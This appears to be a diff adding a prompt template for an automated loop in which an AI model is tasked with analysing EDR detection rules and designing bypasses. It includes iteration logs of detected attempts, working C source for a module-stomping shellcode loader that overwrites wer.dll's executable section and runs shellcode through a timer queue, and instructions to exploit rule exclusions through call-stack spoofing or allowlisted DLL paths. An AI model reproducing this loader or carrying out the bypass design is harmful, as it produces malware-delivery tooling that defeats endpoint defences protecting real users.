@@ -1,0 +1,242 @@
+
+    # EDR Rule Gap Analysis
+    
+    ## Context
+    We are analyzing EDR detection rules to identify logical gaps and design improvements.
+    A test executable triggered alerts or failed validation. We need to understand each rule's logic, identify exceptions/exclusions, and propose precision improvements.
+    
+    ## Memory & History
+    ### Iteration History
+    Iter 1: [outcome=detected]
+Technique: unknown_approach (Standard implementation)
+Triggered Rules: Malicious Behavior Prevention Alert: Suspicious System Module Image Hollowing, Malicious Behavior Prevention Alert: Native API Call from Unsigned Module
+Analysis: Pending AI Analysis
+
+Iter 2: [outcome=detected]
+Technique: unknown_approach (Standard implementation)
+Triggered Rules: Malicious Behavior Prevention Alert: Suspicious System Module Image Hollowing
+Analysis: Pending AI Analysis
+    
+    ### Rule Analysis
+    
+    Solved Rules: Malicious Behavior Prevention Alert: Native API Call from Unsigned Module
+    Persistent Rules: Malicious Behavior Prevention Alert: Suspicious System Module Image Hollowing(x2)
+    Active Rules Details:
+    
+    
+    
+    ### Active Approach Status
+    unknown_approach: 2/3 attempts (target: Malicious Behavior Prevention Alert: Suspicious System Module Image Hollowing)
+        
+    
+    
+    
+    ## Previous Test Results
+    Iteration: 2
+    Status: detected
+    Exit Code: 1
+    Output Snippet: 
+    Error Snippet: Process crashed with exit code 1 (0x00000001)
+    Compile Success: True
+    Previous Strategy Plan:
+    Here is the EDR rule gap analysis.
+
+### Overall Analysis
+
+The submitted code performs "Module Stomping" by loading a legitimate system DLL (`mshtml.dll`), overwriting its executable (`.text`) section with shellcode, and then creating a new thread to execute it. This approach triggered two distinct rules: one focused on the act of modifying a system module's memory, and another focused on the subsequent execution from that modified, untrusted memory. The process crash was likely caused by the EDR
+
+    ## Previous Code (C source that was tested)
+    ```c
+    #include <windows.h>
+#include <stdio.h>
+#include <winnt.h>
+
+// Function to perform module stomping and execute via timer callback
+BOOL ModuleStompAndExecute(unsigned char* shellcode, size_t shellcode_size);
+
+int main(int argc, char *argv[]) {{
+    if (argc != 2) {{
+        printf("Usage: %s <path_to_shellcode.bin>\n", argv[0]);
+        return 1;
+    }}
+
+    // Read shellcode from file
+    FILE *fp = fopen(argv[1], "rb");
+    if (!fp) {{
+        perror("[-] Failed to open shellcode file");
+        return 1;
+    }}
+
+    fseek(fp, 0, SEEK_END);
+    size_t shellcode_size = ftell(fp);
+    fseek(fp, 0, SEEK_SET);
+
+    unsigned char *shellcode = (unsigned char*)malloc(shellcode_size);
+    if (!shellcode) {{
+        perror("[-] Failed to allocate memory for shellcode");
+        fclose(fp);
+        return 1;
+    }}
+
+    size_t bytes_read = fread(shellcode, 1, shellcode_size, fp);
+    if (bytes_read != shellcode_size) {{
+        perror("[-] Failed to read shellcode file completely");
+        free(shellcode);
+        fclose(fp);
+        return 1;
+    }}
+    fclose(fp);
+
+    printf("[+] Shellcode read from %s (%zu bytes)\n", argv[1], shellcode_size);
+
+    // Perform module stomping and indirect execution
+    if (!ModuleStompAndExecute(shellcode, shellcode_size)) {{
+        printf("[-] Module stomping and execution failed.\n");
+        free(shellcode);
+        return 1;
+    }}
+
+    printf("[+] Module stomping and timer creation successful. Waiting for shellcode to execute...\n");
+    free(shellcode);
+    return 0;
+}}
+
+BOOL ModuleStompAndExecute(unsigned char* shellcode, size_t shellcode_size) {{
+    // 1. Load a legitimate but less-critical DLL. wer.dll (Windows Error Reporting) is a good candidate.
+    const char* target_module = "wer.dll";
+    HMODULE hModule = LoadLibraryA(target_module);
+    if (hModule == NULL) {{
+        printf("[-] Failed to load %s. Error: %lu\n", target_module, GetLastError());
+        return FALSE;
+    }}
+    printf("[+] Loaded %s at base address: 0x%p\n", target_module, (void*)hModule);
+
+    // 2. Parse PE headers to find the .text section
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
+    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {{
+        printf("[-] Invalid DOS signature.\n");
+        FreeLibrary(hModule);
+        return FALSE;
+    }}
+
+    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)hModule + dosHeader->e_lfanew);
+    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {{
+        printf("[-] Invalid NT signature.\n");
+        FreeLibrary(hModule);
+        return FALSE;
+    }}
+
+    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
+    PIMAGE_SECTION_HEADER textSection = NULL;
+
+    // Iterate through sections to find the first executable one (usually .text)
+    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {{
+        if (sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) {{
+            textSection = sectionHeader;
+            printf("[+] Found executable section '%s' at RVA 0x%X\n", textSection->Name, textSection->VirtualAddress);
+            break;
+        }}
+        sectionHeader++;
+    }}
+
+    if (textSection == NULL) {{
+        printf("[-] Could not find an executable section.\n");
+        FreeLibrary(hModule);
+        return FALSE;
+    }}
+
+    // 3. Check if the section is large enough for our shellcode
+    if (textSection->SizeOfRawData < shellcode_size) {{
+        printf("[-] Executable section is too small (%u bytes) for the shellcode (%zu bytes).\n", textSection->SizeOfRawData, shellcode_size);
+        FreeLibrary(hModule);
+        return FALSE;
+    }}
+    printf("[+] Section size (%u bytes) is sufficient for shellcode (%zu bytes).\n", textSection->SizeOfRawData, shellcode_size);
+    
+    LPVOID textSectionAddress = (LPVOID)((LPBYTE)hModule + textSection->VirtualAddress);
+
+    // 4. Change memory permissions to RW
+    DWORD oldProtect;
+    if (!VirtualProtect(textSectionAddress, shellcode_size, PAGE_READWRITE, &oldProtect)) {{
+        printf("[-] Failed to change memory permissions to RW. Error: %lu\n", GetLastError());
+        FreeLibrary(hModule);
+        return FALSE;
+    }}
+    printf("[+] Changed memory permissions to PAGE_READWRITE.\n");
+
+    // 5. Copy the shellcode into the section
+    memcpy(textSectionAddress, shellcode, shellcode_size);
+    printf("[+] Copied shellcode to target section.\n");
+
+    // 6. Restore memory permissions to RX
+    if (!VirtualProtect(textSectionAddress, shellcode_size, oldProtect, &oldProtect)) {{
+        printf("[-] Failed to restore memory permissions. Error: %lu\n", GetLastError());
+        // This is not ideal, but we can try to continue
+    }}
+    printf("[+] Restored memory permissions.\n");
+
+    // 7. Execute the shellcode indirectly using a timer queue callback
+    printf("[*] Creating timer queue to execute shellcode...\n");
+    HANDLE hTimerQueue = CreateTimerQueue();
+    if (hTimerQueue == NULL) {{
+        printf("[-] Failed to create timer queue. Error: %lu\n", GetLastError());
+        FreeLi
+
+... (code truncated for length)
+    ```
+    
+    
+    ## Task
+    1. **Analyze** the execution failure or detection alert using the provided telemetry
+    2. **Per-Rule Analysis**: For EACH triggered detection rule (or previously triggered rule), perform individual gap analysis:
+    - Identify the rule's detection logic and scope
+    - **Priority 1**: Examine the rule's exclusion/exception conditions (check "Active Rules Details" if available)
+    - **Priority 2**: Find gaps in the current technique's implementation that could bypass this specific rule
+    - **Priority 3**: If no gap exists within the current technique, propose alternative approaches
+    3. **Design** next validation strategy focusing on rule gaps, NOT just evasion
+        
+    ## Exclusion Strategy Constraints
+    When analyzing Known_Exclusions, adhere to these rules:
+    - **Ignore `process.executable`**: The loader's filename and filepath cannot be modified, so do not propose exclusions based on them.
+    - **Ignore `code_signature`**: Signatures cannot be applied, so do not propose exclusions based on trusted signers.
+    - **Notable Exclusions**: **Stack-based** (e.g., call stack modules) and **API-based** exclusions.
+
+    ## Example of Analysis Logic
+    When analyzing a detection rule, identify conditions that can be neutralized by altering specific parameters. For instance:
+
+    - **Regex Constraints**: If a rule filters `process.Ext.api.metadata.target_address_path` with a regex like `c:\\windows\\(system32|syswow64)\\[a-z]+.dll`, using a DLL from a different directory (e.g., `C:\\Program Files\\...`) would serve as a bypass technique.
+
+    - **Allowlists**: If there is an exclusion list (`NOT LIKE`) for specific paths such as:
+      - `c:\\windows\\assembly\\nativeimages_*.dll`
+      - `c:\\program files\\*`
+      The detection can be evaded by ensuring the `call_stack` (e.g., via call stack spoofing or API proxying) or module path (e.g., Module Stomping a DLL loaded from that allowed path) aligns with these allowed paths.
+
+    **Requirements for Prompt Construction:**
+    Generalization: Do not fixate only on the examples provided above. The model should flexibly identify "Allowlists" or "Excluded Conditions" within any given rule and prioritize satisfying those exclusions.
+
+    ## Standard Testing Methodologies
+    - **rwx_allocation**: Allocate memory with PAGE_EXECUTE_READWRITE (RWX) permissions directly. The simplest and most straightforward method of running shellcode.
+    - **RW_to_RX**: Allocate as PAGE_READWRITE, write shellcode, then VirtualProtect to PAGE_EXECUTE_READ. Avoids suspicious RWX permissions.
+    - **module_stomping** [USER-PREFERRED]: Load legitimate DLL (ex: mshtml.dll, edgehtml.dll. NOT kernel32.dll), locate executable section, overwrite with shellcode. Uses existing executable memory.
+
+    ### USER PREFERRED TECHNIQUES (Prioritize these!)
+    - **module_stomping**
+    
+    
+    ## Output Format
+    For Rule: [Rule Name 1]
+    
+    - **Detection_Logic**: [How this rule identifies threats - be specific about monitored APIs, memory types, etc.]
+    - **Known_Exclusions**: [List any exception conditions from "Active Rules Details" or common EDR patterns]
+    - **Gap_Detail**: [Specific weakness in rule logic or current implementation]
+    - **Bypass_Strategy**: [How to exploit this gap - prefer same technique modification over new technique]
+
+    For Rule: [Rule Name 1]
+
+    - **Detection_Logic**: [How this rule identifies threats - be specific about monitored APIs, memory types, etc.]
+    - **Known_Exclusions**: [List any exception conditions from "Active Rules Details" or common EDR patterns]
+    - **Gap_Detail**: [Specific weakness in rule logic or current implementation]
+    - **Bypass_Strategy**: [How to exploit this gap - prefer same technique modification over new technique]
+
+    [Repeat for each triggered rule]
+    
